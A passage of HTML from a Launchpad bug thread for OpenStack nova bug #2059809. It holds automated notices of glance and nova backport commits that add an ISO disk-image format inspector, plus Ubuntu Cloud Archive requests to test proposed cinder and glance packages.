<p>&nbsp;&nbsp;&nbsp;&nbsp;A test for stashing qcow content in the system_area<br />
&nbsp;&nbsp;&nbsp;&nbsp;of an iso file is also included.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change modifies format_<wbr />inspector.<wbr />detect_<wbr />file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;to evaluate all inspectors until they are complete and<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise an InvalidDiskInfo exception if multiple formats<br />
&nbsp;&nbsp;&nbsp;&nbsp;match.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Id706480e31687d<wbr />8ade6f7199b600a<wbr />ff3ad7c68f7<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d8de63a5008b811<wbr />f2e22cc5cdda59b<wbr />d2cc05b207)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/927459
Committed: https://opendev.org/openstack/glance/commit/eed2a8aeb7a2e1ba47ff5642a346a97e85b6b0ff
Submitter: "Zuul (22348)"
Branch:    stable/2024.1

commit eed2a8aeb7a2e1ba47ff5642a346a97e85b6b0ff
Author: Abhishek Kekane &lt;akekane@redhat.com&gt;
Date:   Mon Jul 8 19:28:38 2024 +0000

    Add iso file format inspector
    
    This change excludes image conversion if source image
    format is ISO.
    
    This change includes unit tests for the ISO
    format inspector using mkisofs to generate
    the iso files.
    
    A test for stashing qcow content in the system_area
    of an iso file is also included.
    
    This change modifies format_inspector.detect_file_format
    to evaluate all inspectors until they are complete and
    raise an InvalidDiskInfo exception if multiple formats
    match.
    
    Related-Bug: #2059809
    Change-Id: Id706480e31687d8ade6f7199b600aff3ad7c68f7
    (cherry picked from commit d8de63a5008b811f2e22cc5cdda59bd2cc05b207)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/431" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-30T06:00:25.757557+00:00" title="2024-08-30 06:00:25 UTC">on 2024-08-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/431">
                <strong>Related fix proposed to glance (stable/2023.2)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/431"> #431</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: stable/2023.2<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/927568">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/927568</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: stable/2023.2
Review: https://review.opendev.org/c/openstack/glance/+/927568</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/432" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-30T10:25:03.881678+00:00" title="2024-08-30 10:25:03 UTC">on 2024-08-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/432">
                <strong>Related fix merged to glance (stable/2023.2)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/432"> #432</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/927568">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/927568</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/5b4be5b6f2f67ec8e61bceff8c2ed79b870aace0">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />5b4be5b6f2f67ec<wbr />8e61bceff8c2ed7<wbr />9b870aace0</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    stable/2023.2</p>
<p>commit 5b4be5b6f2f67ec<wbr />8e61bceff8c2ed7<wbr />9b870aace0<br />
Author: Abhishek Kekane &lt;email address hidden&gt;<br />
Date:   Mon Jul 8 19:28:38 2024 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add iso file format inspector</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change excludes image conversion if source image<br />
&nbsp;&nbsp;&nbsp;&nbsp;format is ISO.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change includes unit tests for the ISO<br />
&nbsp;&nbsp;&nbsp;&nbsp;format inspector using mkisofs to generate<br />
&nbsp;&nbsp;&nbsp;&nbsp;the iso files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;A test for stashing qcow content in the system_area<br />
&nbsp;&nbsp;&nbsp;&nbsp;of an iso file is also included.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change modifies format_<wbr />inspector.<wbr />detect_<wbr />file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;to evaluate all inspectors until they are complete and<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise an InvalidDiskInfo exception if multiple formats<br />
&nbsp;&nbsp;&nbsp;&nbsp;match.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Id706480e31687d<wbr />8ade6f7199b600a<wbr />ff3ad7c68f7<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d8de63a5008b811<wbr />f2e22cc5cdda59b<wbr />d2cc05b207)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit eed2a8aeb7a2e1b<wbr />a47ff5642a346a9<wbr />7e85b6b0ff)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/927568
Committed: https://opendev.org/openstack/glance/commit/5b4be5b6f2f67ec8e61bceff8c2ed79b870aace0
Submitter: "Zuul (22348)"
Branch:    stable/2023.2

commit 5b4be5b6f2f67ec8e61bceff8c2ed79b870aace0
Author: Abhishek Kekane &lt;akekane@redhat.com&gt;
Date:   Mon Jul 8 19:28:38 2024 +0000

    Add iso file format inspector
    
    This change excludes image conversion if source image
    format is ISO.
    
    This change includes unit tests for the ISO
    format inspector using mkisofs to generate
    the iso files.
    
    A test for stashing qcow content in the system_area
    of an iso file is also included.
    
    This change modifies format_inspector.detect_file_format
    to evaluate all inspectors until they are complete and
    raise an InvalidDiskInfo exception if multiple formats
    match.
    
    Related-Bug: #2059809
    Change-Id: Id706480e31687d8ade6f7199b600aff3ad7c68f7
    (cherry picked from commit d8de63a5008b811f2e22cc5cdda59bd2cc05b207)
    (cherry picked from commit eed2a8aeb7a2e1ba47ff5642a346a97e85b6b0ff)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/433" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-30T11:11:37.153187+00:00" title="2024-08-30 11:11:37 UTC">on 2024-08-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/433">
                <strong>Related fix proposed to glance (stable/2023.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/433"> #433</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: stable/2023.1<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/927580">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/927580</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: stable/2023.1
Review: https://review.opendev.org/c/openstack/glance/+/927580</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/434" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-30T16:45:54.415967+00:00" title="2024-08-30 16:45:54 UTC">on 2024-08-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/434">
                <strong>Related fix merged to glance (stable/2023.1)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/434"> #434</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/927580">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/927580</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/1427857a7d2a823bb754cf2f12f2b10e7b3df31d">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />1427857a7d2a823<wbr />bb754cf2f12f2b1<wbr />0e7b3df31d</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    stable/2023.1</p>
<p>commit 1427857a7d2a823<wbr />bb754cf2f12f2b1<wbr />0e7b3df31d<br />
Author: Abhishek Kekane &lt;email address hidden&gt;<br />
Date:   Mon Jul 8 19:28:38 2024 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add iso file format inspector</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change excludes image conversion if source image<br />
&nbsp;&nbsp;&nbsp;&nbsp;format is ISO.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change includes unit tests for the ISO<br />
&nbsp;&nbsp;&nbsp;&nbsp;format inspector using mkisofs to generate<br />
&nbsp;&nbsp;&nbsp;&nbsp;the iso files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;A test for stashing qcow content in the system_area<br />
&nbsp;&nbsp;&nbsp;&nbsp;of an iso file is also included.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change modifies format_<wbr />inspector.<wbr />detect_<wbr />file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;to evaluate all inspectors until they are complete and<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise an InvalidDiskInfo exception if multiple formats<br />
&nbsp;&nbsp;&nbsp;&nbsp;match.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Id706480e31687d<wbr />8ade6f7199b600a<wbr />ff3ad7c68f7<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit d8de63a5008b811<wbr />f2e22cc5cdda59b<wbr />d2cc05b207)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit eed2a8aeb7a2e1b<wbr />a47ff5642a346a9<wbr />7e85b6b0ff)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 5b4be5b6f2f67ec<wbr />8e61bceff8c2ed7<wbr />9b870aace0)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/927580
Committed: https://opendev.org/openstack/glance/commit/1427857a7d2a823bb754cf2f12f2b10e7b3df31d
Submitter: "Zuul (22348)"
Branch:    stable/2023.1

commit 1427857a7d2a823bb754cf2f12f2b10e7b3df31d
Author: Abhishek Kekane &lt;akekane@redhat.com&gt;
Date:   Mon Jul 8 19:28:38 2024 +0000

    Add iso file format inspector
    
    This change excludes image conversion if source image
    format is ISO.
    
    This change includes unit tests for the ISO
    format inspector using mkisofs to generate
    the iso files.
    
    A test for stashing qcow content in the system_area
    of an iso file is also included.
    
    This change modifies format_inspector.detect_file_format
    to evaluate all inspectors until they are complete and
    raise an InvalidDiskInfo exception if multiple formats
    match.
    
    Related-Bug: #2059809
    Change-Id: Id706480e31687d8ade6f7199b600aff3ad7c68f7
    (cherry picked from commit d8de63a5008b811f2e22cc5cdda59bd2cc05b207)
    (cherry picked from commit eed2a8aeb7a2e1ba47ff5642a346a97e85b6b0ff)
    (cherry picked from commit 5b4be5b6f2f67ec8e61bceff8c2ed79b870aace0)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/435" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~james-page" class="sprite person">James Page (james-page)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-03T07:19:11.089510+00:00" title="2024-09-03 07:19:11 UTC">on 2024-09-03</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/435">
                <strong>Please test proposed package</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/435"> #435</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hello Martin, or anyone else affected,</p>
<p>Accepted cinder into ussuri-proposed. The package will build now and be available in the Ubuntu Cloud Archive in a few hours, and then in the -proposed repository.</p>
<p>Please help us by testing this new package. To enable the -proposed repository:</p>
<p>&nbsp;&nbsp;sudo add-apt-repository cloud-archive:<wbr />ussuri-<wbr />proposed<br />
&nbsp;&nbsp;sudo apt-get update</p>
<p>Your feedback will aid us getting this update out to other Ubuntu users.</p>
<p>If this package fixes the bug for you, please add a comment to this bug, mentioning the version of the package you tested, and change the tag from verification-<wbr />ussuri-<wbr />needed to verification-<wbr />ussuri-<wbr />done. If it does not fix the bug for you, please add a comment stating that, and change the tag to verification-<wbr />ussuri-<wbr />failed. In either case, details of your testing will help us make a better decision.</p>
<p>Further information regarding the verification process can be found at <a rel="nofollow" href="https://wiki.ubuntu.com/QATeam/PerformingSRUVerification">https:/<wbr />/wiki.ubuntu.<wbr />com/QATeam/<wbr />PerformingSRUVe<wbr />rification</a> . Thank you in advance!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hello Martin, or anyone else affected,

Accepted cinder into ussuri-proposed. The package will build now and be available in the Ubuntu Cloud Archive in a few hours, and then in the -proposed repository.

Please help us by testing this new package. To enable the -proposed repository:

  sudo add-apt-repository cloud-archive:ussuri-proposed
  sudo apt-get update

Your feedback will aid us getting this update out to other Ubuntu users.

If this package fixes the bug for you, please add a comment to this bug, mentioning the version of the package you tested, and change the tag from verification-ussuri-needed to verification-ussuri-done. If it does not fix the bug for you, please add a comment stating that, and change the tag to verification-ussuri-failed. In either case, details of your testing will help us make a better decision.

Further information regarding the verification process can be found at https://wiki.ubuntu.com/QATeam/PerformingSRUVerification . Thank you in advance!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-ussuri-needed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/436" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~james-page" class="sprite person">James Page (james-page)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-03T07:19:27.364153+00:00" title="2024-09-03 07:19:27 UTC">on 2024-09-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/436"> #436</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hello Martin, or anyone else affected,</p>
<p>Accepted glance into ussuri-proposed. The package will build now and be available in the Ubuntu Cloud Archive in a few hours, and then in the -proposed repository.</p>
<p>Please help us by testing this new package. To enable the -proposed repository:</p>
<p>&nbsp;&nbsp;sudo add-apt-repository cloud-archive:<wbr />ussuri-<wbr />proposed<br />
&nbsp;&nbsp;sudo apt-get update</p>
<p>Your feedback will aid us getting this update out to other Ubuntu users.</p>
<p>If this package fixes the bug for you, please add a comment to this bug, mentioning the version of the package you tested, and change the tag from verification-<wbr />ussuri-<wbr />needed to verification-<wbr />ussuri-<wbr />done. If it does not fix the bug for you, please add a comment stating that, and change the tag to verification-<wbr />ussuri-<wbr />failed. In either case, details of your testing will help us make a better decision.</p>
<p>Further information regarding the verification process can be found at <a rel="nofollow" href="https://wiki.ubuntu.com/QATeam/PerformingSRUVerification">https:/<wbr />/wiki.ubuntu.<wbr />com/QATeam/<wbr />PerformingSRUVe<wbr />rification</a> . Thank you in advance!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hello Martin, or anyone else affected,

Accepted glance into ussuri-proposed. The package will build now and be available in the Ubuntu Cloud Archive in a few hours, and then in the -proposed repository.

Please help us by testing this new package. To enable the -proposed repository:

  sudo add-apt-repository cloud-archive:ussuri-proposed
  sudo apt-get update

Your feedback will aid us getting this update out to other Ubuntu users.

If this package fixes the bug for you, please add a comment to this bug, mentioning the version of the package you tested, and change the tag from verification-ussuri-needed to verification-ussuri-done. If it does not fix the bug for you, please add a comment stating that, and change the tag to verification-ussuri-failed. In either case, details of your testing will help us make a better decision.

Further information regarding the verification process can be found at https://wiki.ubuntu.com/QATeam/PerformingSRUVerification . Thank you in advance!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/437" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-12T11:51:01.586319+00:00" title="2024-09-12 11:51:01 UTC">on 2024-09-12</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/437">
                <strong>Related fix merged to nova (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/437"> #437</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925592">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925592</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/e7c2281b03a9eb52281ada9273938ad0d5c52202">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />e7c2281b03a9eb5<wbr />2281ada9273938a<wbr />d0d5c52202</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit e7c2281b03a9eb5<wbr />2281ada9273938a<wbr />d0d5c52202<br />
Author: Sean Mooney &lt;email address hidden&gt;<br />
Date:   Thu Jul 4 20:09:31 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Add iso file format inspector</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change includes unit tests for the ISO<br />
&nbsp;&nbsp;&nbsp;&nbsp;format inspector using mkisofs to generate<br />
&nbsp;&nbsp;&nbsp;&nbsp;the iso files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;A test for stashing qcow content in the system_area<br />
&nbsp;&nbsp;&nbsp;&nbsp;of an iso file is also included.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change modifies format_<wbr />inspector.<wbr />detect_<wbr />file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;to evaluate all inspectors until they are complete and<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise an InvalidDiskInfo exception if multiple formats<br />
&nbsp;&nbsp;&nbsp;&nbsp;match.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I7e12718fb3e1f7<wbr />7eb8d1cfcb9fa64<wbr />e8ddeb9e712<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit b1cc39848ebe9b9<wbr />cb63141a647bda5<wbr />2a2842ee4b)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit eeda7c333c77321<wbr />6c2161599266738<wbr />74ce4843ba)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 24628ecbbe9d5fd<wbr />d4fe6767ca92395<wbr />f0d3da9e48)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 65f0789df05e2ba<wbr />7f11c0eaf2c6959<wbr />367acbced2)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit e8f00617ed319aa<wbr />37f6946cf10883e<wbr />ef6d180612)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/925592
Committed: https://opendev.org/openstack/nova/commit/e7c2281b03a9eb52281ada9273938ad0d5c52202
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit e7c2281b03a9eb52281ada9273938ad0d5c52202
Author: Sean Mooney &lt;work@seanmooney.info&gt;
Date:   Thu Jul 4 20:09:31 2024 +0100

    Add iso file format inspector
    
    This change includes unit tests for the ISO
    format inspector using mkisofs to generate
    the iso files.
    
    A test for stashing qcow content in the system_area
    of an iso file is also included.
    
    This change modifies format_inspector.detect_file_format
    to evaluate all inspectors until they are complete and
    raise an InvalidDiskInfo exception if multiple formats
    match.
    
    Related-Bug: #2059809
    Change-Id: I7e12718fb3e1f77eb8d1cfcb9fa64e8ddeb9e712
    (cherry picked from commit b1cc39848ebe9b9cb63141a647bda52a2842ee4b)
    (cherry picked from commit eeda7c333c773216c216159926673874ce4843ba)
    (cherry picked from commit 24628ecbbe9d5fdd4fe6767ca92395f0d3da9e48)
    (cherry picked from commit 65f0789df05e2ba7f11c0eaf2c6959367acbced2)
    (cherry picked from commit e8f00617ed319aa37f6946cf10883eef6d180612)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/438" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
